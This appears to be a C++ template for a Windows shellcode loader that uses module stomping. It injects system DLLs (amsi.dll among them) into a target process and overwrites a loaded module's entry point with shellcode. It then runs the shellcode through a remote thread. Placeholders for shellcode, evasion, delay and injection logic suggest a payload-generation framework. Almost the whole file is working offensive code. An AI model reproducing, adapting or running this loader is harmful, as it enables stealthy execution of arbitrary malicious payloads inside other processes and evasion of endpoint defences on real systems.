#include <iostream>
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <tchar.h>
#include <string>


//####INCLUDE####

//####DEFINE####

//####CODE####

typedef HMODULE (WINAPI *pLoadLibraryExW)(
    LPCWSTR lpLibFileName,
    HANDLE hFile,
    DWORD dwFlags
);

// Define NTSTATUS if not already defined
#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif

// Define DONT_RESOLVE_DLL_REFERENCES if not already defined
#ifndef DONT_RESOLVE_DLL_REFERENCES
#define DONT_RESOLVE_DLL_REFERENCES 0x00000001
#endif

DWORD WINAPI esc_main(LPVOID lpParameter)
{
    unsigned char encoded[] = ####SHELLCODE####;
    SIZE_T length = sizeof(encoded);


    //####CALL####
    unsigned char* decoded = encoded;


    //####SYSCALL####
    HANDLE hProc = NULL;
    HANDLE hThread = NULL;
    DWORD oldProtect = 0;
    NTSTATUS status;

    //####INJECTION####

    // Validate that we have a valid process handle
    if (hProc == NULL) {
        std::cerr << "No valid target process handle provided" << std::endl;
        return 1;
    }

    // Choose DLLs to try injecting and stomping - using full paths
    const char* dllsToTry[] = {
        "C:\\Windows\\System32\\winmm.dll",
        "C:\\Windows\\System32\\amsi.dll",
        "C:\\Windows\\System32\\uxtheme.dll",
        "C:\\Windows\\System32\\urlmon.dll",
        "C:\\Windows\\System32\\winspool.drv"
    };
    
    HMODULE remoteModule = NULL;
    const char* dllToStomp = NULL;
    
    for (int i = 0; i < sizeof(dllsToTry)/sizeof(dllsToTry[0]); i++) {
        dllToStomp = dllsToTry[i];
        std::cout << "Attempting to inject: " << dllToStomp << std::endl;
        
        // Allocate memory for the DLL path in the remote process
        size_t pathLen = strlen(dllToStomp) + 1;
        LPVOID remoteBuffer = VirtualAllocEx(hProc, NULL, pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remoteBuffer) {
            std::cerr << "Failed to allocate memory for DLL path. Error: " << GetLastError() << std::endl;
            continue;
        }

        // Write the DLL path to the remote process
        if (!WriteProcessMemory(hProc, remoteBuffer, dllToStomp, pathLen, NULL)) {
            std::cerr << "Failed to write DLL path. Error: " << GetLastError() << std::endl;
            VirtualFreeEx(hProc, remoteBuffer, 0, MEM_RELEASE);
            continue;
        }

        // Get address of LoadLibraryA (using A version instead of W for ANSI strings)
        LPTHREAD_START_ROUTINE loadLibraryAddr = (LPTHREAD_START_ROUTINE)GetProcAddress(
            GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
        if (!loadLibraryAddr) {
            std::cerr << "Failed to get address of LoadLibraryA. Error: " << GetLastError() << std::endl;
            VirtualFreeEx(hProc, remoteBuffer, 0, MEM_RELEASE);
            continue;
        }

        // Create a remote thread to load the DLL
        hThread = CreateRemoteThread(hProc, NULL, 0, loadLibraryAddr, remoteBuffer, 0, NULL);
        if (!hThread) {
            std::cerr << "Failed to create remote thread. Error: " << GetLastError() << std::endl;
            VirtualFreeEx(hProc, remoteBuffer, 0, MEM_RELEASE);
            continue;
        }

        // Wait for the thread to complete
        WaitForSingleObject(hThread, 2000);  // Wait longer (2 seconds)
        CloseHandle(hThread);
        
        std::cout << "DLL injection thread completed, checking if module was loaded..." << std::endl;
        
        // Extract just the filename from the path for comparison
        char filename[MAX_PATH] = {0};
        const char* lastSlash = strrchr(dllToStomp, '\\');
        if (lastSlash) {
            strcpy_s(filename, sizeof(filename), lastSlash + 1);
        } else {
            strcpy_s(filename, sizeof(filename), dllToStomp);
        }
        
        // Find the injected module in the remote process
        HMODULE hModules[1024] = {0};
        DWORD cbNeeded = 0;
        char moduleName[MAX_PATH] = {0};
        
        if (EnumProcessModules(hProc, hModules, sizeof(hModules), &cbNeeded)) {
            for (unsigned int j = 0; j < (cbNeeded / sizeof(HMODULE)); j++) {
                if (GetModuleFileNameExA(hProc, hModules[j], moduleName, sizeof(moduleName))) {
                    // Check if the module name contains our DLL name
                    if (strstr(moduleName, filename) != nullptr) {
                        remoteModule = hModules[j];
                        std::cout << "Found module " << filename << " at address 0x" << std::hex << remoteModule << std::endl;
                        break;
                    }
                }
            }
        }
        
        VirtualFreeEx(hProc, remoteBuffer, 0, MEM_RELEASE);
        
        if (remoteModule) {
            break;  // Found a module, exit the loop
        }
    }
    
    if (!remoteModule) {
        std::cerr << "Failed to inject and find any module in remote process" << std::endl;
        return 1;
    }

    // Read the PE header from the remote process
    DWORD headerBufferSize = 0x1000;
    LPVOID headerBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerBufferSize);
    if (!headerBuffer) {
        std::cerr << "Failed to allocate memory for PE header. Error: " << GetLastError() << std::endl;
        return 1;
    }
    
    if (!ReadProcessMemory(hProc, remoteModule, headerBuffer, headerBufferSize, NULL)) {
        std::cerr << "Failed to read PE header from remote process. Error: " << GetLastError() << std::endl;
        HeapFree(GetProcessHeap(), 0, headerBuffer);
        return 1;
    }
    
    // Parse the PE header to find the entry point
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headerBuffer;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)headerBuffer + dosHeader->e_lfanew);
    DWORD_PTR entryPointOffset = ntHeader->OptionalHeader.AddressOfEntryPoint;
    LPVOID entryPoint = (LPVOID)((DWORD_PTR)remoteModule + entryPointOffset);
    
    std::cout << "Module entry point offset: 0x" << std::hex << entryPointOffset << std::endl;
    std::cout << "Module entry point address: 0x" << std::hex << entryPoint << std::endl;
    
    // Write shellcode to the module's entry point
    std::cout << "Writing shellcode to module entry point..." << std::endl;
    
    // Change memory protection to allow writing
    if (!VirtualProtectEx(hProc, entryPoint, length, PAGE_READWRITE, &oldProtect)) {
        std::cerr << "VirtualProtectEx failed with error: " << GetLastError() << std::endl;
        HeapFree(GetProcessHeap(), 0, headerBuffer);
        return 1;
    }
    
    // Write shellcode to the module's entry point
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProc, entryPoint, decoded, length, &bytesWritten)) {
        std::cerr << "WriteProcessMemory failed with error: " << GetLastError() << std::endl;
        HeapFree(GetProcessHeap(), 0, headerBuffer);
        return 1;
    }
    
    std::cout << "Successfully wrote " << std::dec << bytesWritten << " bytes to the module entry point" << std::endl;
    
    // Restore original memory protection
    DWORD tempProtect;
    if (!VirtualProtectEx(hProc, entryPoint, length, PAGE_EXECUTE_READ, &tempProtect)) {
        std::cerr << "Failed to restore memory protection. Error: " << GetLastError() << std::endl;
        HeapFree(GetProcessHeap(), 0, headerBuffer);
        return 1;
    }
    
    // Free the header buffer
    HeapFree(GetProcessHeap(), 0, headerBuffer);
    
    // Execute the shellcode by creating a thread at the entry point
    std::cout << "Executing shellcode from module entry point..." << std::endl;
    
    hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);
    if (!hThread) {
        std::cerr << "Failed to create remote thread to execute shellcode. Error: " << GetLastError() << std::endl;
        return 1;
    }
    
    // Wait for the thread to complete
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    
    std::cout << "Execution completed in remote process" << std::endl;
    
    return 0;
}

int main()
{
    //####DELAY####
    //####EVASION####
    //####ARGS####
    esc_main(NULL);
    return 0;
} 